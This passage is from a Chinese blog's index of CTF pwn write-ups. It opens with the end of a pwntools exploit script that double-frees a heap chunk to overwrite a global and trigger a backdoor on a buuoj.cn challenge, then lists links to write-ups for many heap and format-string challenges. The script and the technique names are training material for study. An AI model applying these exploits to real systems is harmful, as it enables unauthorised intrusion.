libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27879</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>        sla(<span class="hljs-string">&#x27;choice&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;size&gt;\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;choice&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;index&gt;\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>        sla(<span class="hljs-string">&#x27;choice&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;index&gt;\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>        se(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>():<br>        sla(<span class="hljs-string">&#x27;choice&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><span class="hljs-comment">#--------------------------------</span><br>add(<span class="hljs-number">0x40</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x40</span>)<span class="hljs-comment">#1</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#add(0x40)</span><br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0x602080</span>))<br>add(<span class="hljs-number">0x40</span>)<br>add(<span class="hljs-number">0x40</span>)<br>edit(<span class="hljs-number">3</span>,p64(<span class="hljs-number">0</span>))<br>backdoor()<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="judgement-mna-2016">judgement_mna_2016</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121165338?spm=1001.2014.3001.5502">judgement_mna_2016（32位fmt）_Nqoinaen的博客-CSDN博客</a></p><h3 id="wustctf2020-name-your-dog">wustctf2020_name_your_dog</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121167688?spm=1001.2014.3001.5502">wustctf2020_name_your_dog（数组越界劫持got）_Nqoinaen的博客-CSDN博客</a></p><h3 id="hitcon-2018-children-tcache">hitcon_2018_children_tcache</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121169047?spm=1001.2014.3001.5502">hitcon_2018_children_tcache（tcache off-by-null，另一种doublefree）_Nqoinaen的博客-CSDN博客</a></p><h3 id="zctf-2016-note3">zctf_2016_note3</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121176333?spm=1001.2014.3001.5502">zctf_2016_note3（整数溢出，unlink）_Nqoinaen的博客-CSDN博客</a></p><h3 id="roarctf-2019-realloc-magic">roarctf_2019_realloc_magic</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121182007?spm=1001.2014.3001.5502">roarctf_2019_realloc_magic（realloc，IO_file_leak，doublefree）_Nqoinaen的博客-CSDN博客_roarctf_2019_realloc_magic</a></p><h3 id="bcloud-bctf-2016">bcloud_bctf_2016</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121216910?spm=1001.2014.3001.5502">bcloud_bctf_2016（32位堆，house-of-force）_Nqoinaen的博客-CSDN博客</a></p><h3 id="xman-2019-format">xman_2019_format</h3><p>（非栈上格式化字符串仅一次利用的爆破）</p><p><a href="https://blog.csdn.net/m0_51251108/article/details/121237020?spm=1001.2014.3001.5502">xman_2019_format（非栈上格式化字符串仅一次利用的爆破）_Nqoinaen的博客-CSDN博客_xman_2019_format</a></p><h3 id="ciscn-2019-final-5">ciscn_2019_final_5</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121275841?spm=1001.2014.3001.5502">ciscn_2019_final_5(临界条件错误，劫持GOT)_Nqoinaen的博客-CSDN博客</a></p><h3 id="qctf2018-stack2">qctf2018_stack2</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121292902?spm=1001.2014.3001.5502">qctf2018_stack2（数组越界，偏移寻找）_Nqoinaen的博客-CSDN博客_qctf2018_stack2</a></p><h3 id="ciscn-2019-sw-1">ciscn_2019_sw_1</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121302556?spm=1001.2014.3001.5502">ciscn_2019_sw_1（fmt劫持fini_array为main，获得一次循环）_Nqoinaen的博客-CSDN博客</a></p><h3 id="gyctf-2020-some-thing-interesting">gyctf_2020_some_thing_interesting</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121306153?spm=1001.2014.3001.5502">gyctf_2020_some_thing_interesting（fmt泄露libc，doublefree）_Nqoinaen的博客-CSDN博客</a></p><h3 id="gyctf-2020-document">gyctf_2020_document</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121321652?spm=1001.2014.3001.5502">gyctf_2020_document(uaf)_Nqoinaen的博客-CSDN博客_gyctf_2020_document</a></p><h3 id="houseoforange-hitcon-2016">houseoforange_hitcon_2016</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121344075?spm=1001.2014.3001.5502">houseoforange_hitcon_2016（unsortbin attack，fsop）_Nqoinaen的博客-CSDN博客_unsortbinattack</a></p><h3 id="ciscn-2019-s-6">ciscn_2019_s_6</h3><p>（uaf）</p><p><a href="https://blog.csdn.net/m0_51251108/article/details/121353453?spm=1001.2014.3001.5502">ciscn_2019_s_6（uaf）_Nqoinaen的博客-CSDN博客</a></p><h3 id="hgame2018-flag-server">hgame2018_flag_server</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121361533?spm=1001.2014.3001.5502">hgame2018_flag_server_Nqoinaen的博客-CSDN博客</a></p><h3 id="de1ctf-2019-weapon">de1ctf_2019_weapon</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121361905?spm=1001.2014.3001.5502">de1ctf_2019_weapon（IO_leak,doublefree）_Nqoinaen的博客-CSDN博客</a></p><h3 id="SWPUCTF-2019-p1KkHeap">SWPUCTF_2019_p1KkHeap</h3><p>（tcache表头攻击，uaf，ORW）</p><p><a href="https://blog.csdn.net/m0_51251108/article/details/121398983?spm=1001.2014.3001.5502">SWPUCTF_2019_p1KkHeap（tcache表头攻击，uaf，ORW）_Nqoinaen的博客-CSDN博客_tcache 列表头</a></p><h3 id="sctf-2019-easy-heap">sctf_2019_easy_heap</h3><p>（off by null，unlink造成doublefree）</p><p><a href="https://blog.csdn.net/m0_51251108/article/details/121411787?spm=1001.2014.3001.5502">sctf_2019_easy_heap（off by null，unlink造成doublefree）_Nqoinaen的博客-CSDN博客_unlink doublefree</a></p><h3 id="picoctf-2018-echooo">picoctf_2018_echooo</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121420155?spm=1001.2014.3001.5502">picoctf_2018_echooo（fmt）_Nqoinaen的博客-CSDN博客</a></p><h3 id="x-nuca-2018-offbyone2">x_nuca_2018_offbyone2</h3><p>（off by null，unlink造成doublefree）</p><p><a href="https://blog.csdn.net/m0_51251108/article/details/121429481?spm=1001.2014.3001.5502">x_nuca_2018_offbyone2（off by null，unlink造成doublefree）_Nqoinaen的博客-CSDN博客_x_nuca_2018_offbyone2</a></p><h2 id="大二下">大二下</h2><h2 id="大三上">大三上</h2><h3 id="shanghai2018-baby-arm，jarvisoj-typo（armrop）">shanghai2018_baby_arm，jarvisoj_typo（armrop）</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/126954854?spm=1001.2014.3001.5502">shanghai2018_baby_arm，jarvisoj_typo（armrop）_Nqoinaen的博客-CSDN博客</a></p><h3 id="qctf-2018-dice-game，xm-2019-awd-pwn2">qctf_2018_dice_game，xm_2019_awd_pwn2</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/126955874?spm=1001.2014.3001.5502">qctf_2018_dice_game，xm_2019_awd_pwn2_Nqoinaen的博客-CSDN博客</a></p><h3 id="2020-新春红包题-3">[2020 新春红包题]3</h3><p>(libc2.29 tcache tashing unlink )</p><p>[<a href="https://blog.csdn.net/m0_51251108/article/details/127078196?spm=1001.2014.3001.5502">2020 新春红包题]3(libc2.29 tcache tashing unlink )_Nqoinaen的博客-CSDN博客</a></p><h3 id="hitcon-ctf-2019-one-punch">hitcon_ctf_2019_one_punch</h3><p>(libc2.29 tcache tashing unlink)</p><p><a href="https://blog.csdn.net/m0_51251108/article/details/127121786?spm=1001.2014.3001.5502">hitcon_ctf_2019_one_punch(libc2.29 tcache tashing unlink)_Nqoinaen的博客-CSDN博客</a></p><h3 id="OGeek2019-Final-OVM">[OGeek2019 Final]OVM</h3><p>（简易虚拟机逃逸）</p><p>[<a href="https://blog.csdn.net/m0_51251108/article/details/127354652?spm=1001.2014.3001.5502">OGeek2019 Final]OVM（简易虚拟机逃逸）_Nqoinaen的博客-CSDN博客_ovm虚拟机</a></p><h2 id="止于此">止于此</h2>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
